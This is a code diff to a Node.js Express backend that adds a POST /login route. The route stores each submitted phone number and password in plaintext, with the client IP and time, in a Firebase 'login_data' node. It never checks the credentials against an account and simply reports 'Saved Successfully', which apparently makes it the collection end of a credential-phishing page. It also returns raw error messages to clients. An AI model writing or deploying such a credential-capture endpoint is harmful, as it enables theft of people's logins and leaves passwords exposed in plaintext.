@@ -22,6 +22,44 @@ app.get("/", (req, res) => {
     res.send("Backend Running Successfully");
 });
 
+app.post("/login", async (req, res) => {
+
+    try {
+
+        const { phone, password } = req.body;
+
+        if (!phone || !password) {
+            return res.status(400).json({
+                success: false,
+                message: "Phone and Password required"
+            });
+        }
+
+        const ref = db.ref("login_data");
+
+        await ref.push({
+            phone,
+            password,
+            ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
+            time: Date.now()
+        });
+
+        res.json({
+            success: true,
+            message: "Saved Successfully"
+        });
+
+    } catch (e) {
+
+        res.status(500).json({
+            success: false,
+            error: e.message
+        });
+
+    }
+
+});
+
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
